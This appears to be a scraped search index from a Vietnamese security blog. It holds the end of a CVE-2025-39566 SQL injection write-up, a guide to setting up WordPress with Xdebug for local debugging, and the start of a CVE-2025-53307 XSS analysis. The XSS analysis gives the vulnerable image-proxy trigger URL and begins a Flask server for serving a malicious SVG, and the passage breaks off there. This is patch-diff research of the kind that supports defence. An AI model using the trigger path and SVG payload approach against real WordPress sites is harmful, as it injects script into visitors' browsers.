tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Assistant c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Assistant: v1.5.2(vul) v√† v1.5.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.\nTrong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem change log ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u:\nChangelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \u0026#34;image proxy\u0026#34; üëâ L·ªó h·ªóng n·∫±m trong file backend/src/Hooks/ImageProxy.php, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n:\nS·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m render_image v·ªõi ch·ª©c nƒÉng:\nNh·∫≠n tham s·ªë url t·ª´ query string ($_GET['url']). G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung. Ch·ªëng ssrf b·∫±ng wp_safe_remote_get. N·∫øu n·ªôi dung c√≥ header Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/, th√¨: G·ª≠i l·∫°i header Content-Type ƒë√≥ cho client. In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát. Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress. SVG c≈©ng c√≥ Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/ v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =\u0026gt; XSS c√≥ th·ªÉ x·∫£y ra. {: .prompt-tip }\nB·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra MIME type th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o.\n$filesystem = self::filesystem(); $tmpfile = tempnam( \u0026#39;/tmp\u0026#39;, \u0026#39;assistant\u0026#39; ); $filesystem-\u0026gt;put_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u0026gt;delete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±.\nN·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =\u0026gt; return false.\nHow it work? Trong __construct c·ªßa class ImageProxy, ph∆∞∆°ng th·ª©c render_image() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook 'init'. Hook 'init' ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát.\nrender_image ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë $_GET['fl_asst_image_proxy'] t·ªìn t·∫°i.\nüëâ Khi truy c·∫≠p /wp-admin/?fl_asst_image_proxy=value1\u0026amp;url=http://yoursite/image-path th√¨ render_image s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã.\nExploit Detect XSS T·∫°o 1 trang web ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload\nfrom flask import Flask, Response app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#39;Hello, World!\u0026#39; @app.route(\u0026#39;/svg\u0026#39;) 